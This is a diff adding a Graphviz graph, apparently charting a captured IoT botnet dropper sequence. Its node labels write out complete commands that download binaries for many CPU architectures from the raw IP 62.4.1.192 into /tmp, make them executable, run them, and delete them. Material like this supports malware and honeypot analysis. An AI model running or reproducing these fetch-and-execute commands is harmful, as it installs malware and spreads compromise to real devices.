@@ -1,0 +1,100 @@
+digraph {
+90 [label="cd /tmp "];
+90 -> 90
+2 [label="wget http://62.4.1.192/jackmymips "];
+2 -> 4 [label=";,"];
+4 [label="chmod +x jackmymips "];
+4 -> 6 [label=";,"];
+6 [label="./jackmymips "];
+6 -> 8 [label=";,"];
+8 [label="rm -rf jackmymips "];
+8 -> 90 [label=";,"];
+90 [label="cd /tmp "];
+90 -> 90
+12 [label="wget http://62.4.1.192/jackmymipsel "];
+12 -> 14 [label=";,"];
+14 [label="chmod +x jackmymipsel "];
+14 -> 16 [label=";,"];
+16 [label="./jackmymipsel "];
+16 -> 18 [label=";,"];
+18 [label="rm -rf jackmymipsel "];
+18 -> 90 [label=";,"];
+90 [label="cd /tmp "];
+90 -> 90
+22 [label="wget http://62.4.1.192/jackmysh4 "];
+22 -> 24 [label=";,"];
+24 [label="chmod +x jackmysh4 "];
+24 -> 26 [label=";,"];
+26 [label="./jackmysh4 "];
+26 -> 28 [label=";,"];
+28 [label="rm -rf jackmysh4 "];
+28 -> 90 [label=";,"];
+90 [label="cd /tmp "];
+90 -> 90
+32 [label="wget http://62.4.1.192/jackmyx86 "];
+32 -> 34 [label=";,"];
+34 [label="chmod +x jackmyx86 "];
+34 -> 36 [label=";,"];
+36 [label="./jackmyx86 "];
+36 -> 38 [label=";,"];
+38 [label="rm -rf jackmyx86 "];
+38 -> 90 [label=";,"];
+90 [label="cd /tmp "];
+90 -> 90
+42 [label="wget http://62.4.1.192/jackmyi686 "];
+42 -> 44 [label=";,"];
+44 [label="chmod +x jackmyi686 "];
+44 -> 46 [label=";,"];
+46 [label="./jackmyi686 "];
+46 -> 48 [label=";,"];
+48 [label="rm -rf jackmyi686 "];
+48 -> 90 [label=";,"];
+90 [label="cd /tmp "];
+90 -> 90
+52 [label="wget http://62.4.1.192/jackmypowerpc "];
+52 -> 54 [label=";,"];
+54 [label="chmod +x jackmypowerpc "];
+54 -> 56 [label=";,"];
+56 [label="./jackmypowerpc "];
+56 -> 58 [label=";,"];
+58 [label="rm -rf jackmypowerpc "];
+58 -> 90 [label=";,"];
+90 [label="cd /tmp "];
+90 -> 90
+62 [label="wget http://62.4.1.192/jackmyi586 "];
+62 -> 64 [label=";,"];
+64 [label="chmod +x jackmyi586 "];
+64 -> 66 [label=";,"];
+66 [label="./jackmyi586 "];
+66 -> 68 [label=";,"];
+68 [label="rm -rf jackmyi586 "];
+68 -> 90 [label=";,"];
+90 [label="cd /tmp "];
+90 -> 90
+72 [label="wget http://62.4.1.192/jackmym86k "];
+72 -> 74 [label=";,"];
+74 [label="chmod +x jackmym86k "];
+74 -> 76 [label=";,"];
+76 [label="./jackmym86k "];
+76 -> 78 [label=";,"];
+78 [label="rm -rf jackmym86k "];
+78 -> 90 [label=";,"];
+90 [label="cd /tmp "];
+90 -> 90
+82 [label="wget http://62.4.1.192/jackmyarmv4 "];
+82 -> 84 [label=";,"];
+84 [label="chmod +x jackmyarmv4 "];
+84 -> 86 [label=";,"];
+86 [label="./jackmyarmv4 "];
+86 -> 88 [label=";,"];
+88 [label="rm -rf jackmyarmv4 "];
+88 -> 90 [label=";,"];
+90 [label="cd /tmp "];
+90 -> 90
+92 [label="wget http://62.4.1.192/jackmyarmv5 "];
+92 -> 94 [label=";,"];
+94 [label="chmod +x jackmyarmv5 "];
+94 -> 96 [label=";,"];
+96 [label="./jackmyarmv5 "];
+96 -> 97 [label=";,"];
+}
